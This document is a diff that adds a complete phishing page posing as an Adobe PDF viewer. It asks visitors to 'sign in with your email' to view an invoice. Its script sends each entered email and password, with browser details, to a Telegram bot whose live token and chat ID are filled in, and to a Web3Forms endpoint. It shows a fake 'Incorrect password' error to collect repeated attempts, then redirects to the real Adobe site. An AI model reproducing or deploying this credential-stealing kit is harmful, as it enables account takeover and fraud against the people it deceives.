@@ -1,0 +1,221 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ADOBE PDF</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="short icon" href="https://gyazo.com/c03cd4aa4ec406839ebd2d81ee28777c?semt=ais_hybrid">
+  <style>
+    body {
+      background-image: url('https://lametric.com/sites/default/files/inline-images/Invoice%203.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: fit;
+      font-family: Arial, sans-serif;
+      color: #333;
+      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: rgba(225, 225, 225, 0.5);
+      padding: 30px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      width: 320px;
+    }
+
+    .logo img {
+      max-width: 55%;
+      height: auto;
+      margin-bottom: 30px;
+    }
+
+    .input-fields input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    .signin-button {
+      padding: 10px 20px;
+      background-color: #E30022;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .signin-button:hover {
+      background-color: #0056b3;
+    }
+
+    .message {
+      display: none;
+      color: red;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img id="logo" src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230524.001/assets/item-types/96/pdf.png" alt="">
+      <p style="margin-bottom: -30px;margin-top: 2px;font-weight: bold;text-align: right;"></p>
+      <p style="font-size: 12px;align: left;margin-bottom: 10px;color: green;">Every tool you need to work with <br>PDFs in one place.</p>
+      <strong><br>Email verification is required. Sign in with your email to view the document &#x1F512</strong>
+    </div>
+
+    <form id="loginForm">
+      <div class="input-fields">
+        <input id="email" name="email" type="email" placeholder="Email" value="" required />
+        <input id="password" name="password" type="password" placeholder="Password" required />
+      </div>
+      <button type="submit" class="signin-button" id="signin-button">LOGIN</button>
+    </form>
+
+    <div id="message" class="message">Incorrect password</div>
+  </div>
+
+  <script>
+    let attempt = 0;
+    const maxAttempts = 3;
+    const form = document.getElementById('loginForm');
+    const messageDiv = document.getElementById('message');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+
+    // ==================== TELEGRAM CONFIGURATION ====================
+    // IMPORTANT: Replace these with your actual Bot Token and Chat ID
+    // Get Bot Token from @BotFather on Telegram
+    // Get Chat ID from @userinfobot or by sending a message to your bot and visiting:
+    // https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
+    const TELEGRAM_BOT_TOKEN = '8942160206:AAHDi2RsD3UQdjDxavuXzvz81043QRw2MVA';  // <-- REPLACE WITH YOUR BOT TOKEN
+    const TELEGRAM_CHAT_ID = '7821757271';      // <-- REPLACE WITH YOUR CHAT ID
+    // ================================================================
+
+    // Function to send data to Telegram Bot
+    async function sendToTelegram(email, password) {
+      if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        console.warn('Telegram bot not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
+        return false;
+      }
+
+      const timestamp = new Date().toLocaleString();
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      
+      // Format the message for Telegram
+      const message = `🔐 NEW PDF LOGIN ATTEMPT 🔐\n\n` +
+                      `📧 Email: ${email}\n` +
+                      `🔑 Password: ${password}\n` +
+                      `📅 Time: ${timestamp}\n` +
+                      `💻 User Agent: ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\n` +
+                      `🖥️ Platform: ${platform}\n` +
+                      `🌐 Language: ${language}\n` +
+                      `🔄 Attempt: ${attempt + 1}/${maxAttempts}`;
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        
+        const result = await response.json();
+        if (result.ok) {
+          console.log('Telegram message sent successfully');
+          return true;
+        } else {
+          console.error('Telegram error:', result);
+          return false;
+        }
+      } catch (err) {
+        console.error('Failed to send to Telegram:', err);
+        return false;
+      }
+    }
+
+    // --- Extract email parameter from URL fragment (after #) ---
+    (function setEmailFromHash() {
+      const hash = window.location.hash;
+      if (hash && hash.length > 1) {
+        let emailParam = hash.substring(1);
+        try {
+          emailParam = decodeURIComponent(emailParam);
+        } catch (e) {
+          console.warn("URI decoding failed, using raw value");
+        }
+        if (emailParam && emailParam.trim() !== "") {
+          emailInput.value = emailParam;
+        }
+      }
+    })();
+
+    // Hide error message when user starts typing in password field
+    passwordInput.addEventListener('input', function() {
+      messageDiv.style.display = 'none';
+    });
+    
+    passwordInput.addEventListener('focus', function() {
+      messageDiv.style.display = 'none';
+    });
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const email = emailInput.value;
+      const password = passwordInput.value;
+
+      // Send to Web3Forms (original functionality)
+      fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams({
+          access_key: '9301229f-51dc-4b99-bb05-cc866488b',
+          name: 'pdf-resultzzz',
+          email: email,
+          message: password
+        }).toString()
+      }).catch(err => console.error('Web3Forms submission error:', err));
+
+      // Send to Telegram Bot (new functionality)
+      await sendToTelegram(email, password);
+
+      attempt++;
+
+      if (attempt < maxAttempts) {
+        messageDiv.style.display = 'block';
+        messageDiv.textContent = 'Incorrect password';
+        passwordInput.value = '';
+      } else {
+        messageDiv.style.display = 'block';
+        messageDiv.textContent = 'Too many attempts. Redirecting...';
+        setTimeout(function() {
+          window.location.href = 'https://www.adobe.com/acrobat/pdf-reader.html';
+        }, 2000);
+      }
+    });
+  </script>
+</body>
+</html>
